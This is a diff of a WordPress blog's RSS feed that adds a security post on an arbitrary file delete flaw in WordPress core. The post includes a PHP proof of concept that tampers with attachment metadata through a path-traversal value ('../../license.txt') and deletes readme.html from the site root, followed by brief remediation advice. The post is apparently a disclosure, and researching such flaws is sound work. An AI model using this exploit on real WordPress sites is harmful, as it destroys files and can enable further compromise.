@@ -12,7 +12,7 @@
 	<atom:link href="https://wpdeeply.com/feed/" rel="self" type="application/rss+xml" />
 	<link>http://wpdeeply.com/</link>
 	<description></description>
-	<lastBuildDate>Sun, 12 Jul 2020 20:27:44 +0000</lastBuildDate>
+	<lastBuildDate>Sun, 12 Jul 2020 23:00:09 +0000</lastBuildDate>
 	<language>en-US</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
@@ -20,6 +20,73 @@
 	1	</sy:updateFrequency>
 	<generator>https://wordpress.org/?v=5.4.2</generator>
 	<item>
+		<title>WordPress arbitrary file delete</title>
+		<link>https://wpdeeply.com/2020/07/12/wordpress-arbitrary-file-delete/</link>
+		
+		<dc:creator><![CDATA[root]]></dc:creator>
+		<pubDate>Sun, 12 Jul 2020 23:00:08 +0000</pubDate>
+				<category><![CDATA[core]]></category>
+		<guid isPermaLink="false">https://wpdeeply.com/?p=136</guid>
+
+					<description><![CDATA[WordPress have a lot of serious issues with paths. There were several tries in the past for security and core team to fix arbitrary file delete issues in the core, but bugs (plural) still remain. Why this bug presented here exist? (there are many another use cases in the core) Because core is solving arbitrary [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p>WordPress have a lot of serious issues with paths. There were several tries in the past for security and core team to fix arbitrary file delete issues in the core, but bugs (plural) still remain. Why this bug presented here exist? (there are many another use cases in the core) Because core is solving arbitrary file delete on the following way: limit the file (thumbnail) deletion only for the same folder where is file/attachment and make sure thumbnail isn’t used by another media file. Again, technical detailed writing is huge and more advanced (will be presented in near future), but goal of this writing is something else. <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+
+
+
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-arbitrary-file-delete.md#eli5-poc"></a>Eli5 PoC</h2>
+
+
+
+<ul><li>Upload picture in your WP and get its post_id / attachment_id</li><li>this demo code will delete&nbsp;<code>readme.html</code>&nbsp;from WP root directory</li><li>enable&nbsp;<code>hello.php</code>&nbsp;plugin and append this code at the end</li></ul>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">function afd(){
+    
+    global $wpdb;
+    
+    $attachment_id = "93";
+    $thumb = "readme.html" 
+    //set up 'thumb' on the same way core does
+    $newmeta          = wp_get_attachment_metadata( $attachment_id, true );
+    $newmeta['thumb'] = wp_basename( $thumb );
+    wp_update_attachment_metadata( $attachment_id, $newmeta );
+    
+    //set up apropriate value for _wp_attached_file
+    $wpdb->query("UPDATE `wp_postmeta` SET `meta_value` = '../../license.txt' WHERE `wp_postmeta`.`meta_key` = '_wp_attached_file' and `wp_postmeta`.`post_id` = '".esc_sql($attachment_id)."'");
+    //delete attachment    
+    wp_delete_attachment($attachment_id);
+}
+
+add_action("init", "afd");
+</code></pre>
+
+
+
+<ul><li><code>readme.html</code>&nbsp;is deleted from the WP root</li></ul>
+
+
+
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-arbitrary-file-delete.md#few-facts"></a>Few facts</h2>
+
+
+
+<ul><li><code>_wp_attached_file</code>&nbsp;remains single point of failure for WP</li><li>there is use case in the core where creation of backup of any file is possible and this opens door for silent exploitation when arbitrary file delete is in game</li></ul>
+
+
+
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-arbitrary-file-delete.md#remediation"></a>Remediation</h2>
+
+
+
+<ul><li>core files shouldn’t be writable by www-data user</li><li>plugins files shouldn’t be writable by www-data user</li></ul>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
 		<title>WordPress write image to any directory RCE</title>
 		<link>https://wpdeeply.com/2020/07/12/wordpress-write-image-to-any-directory-rce/</link>
 		
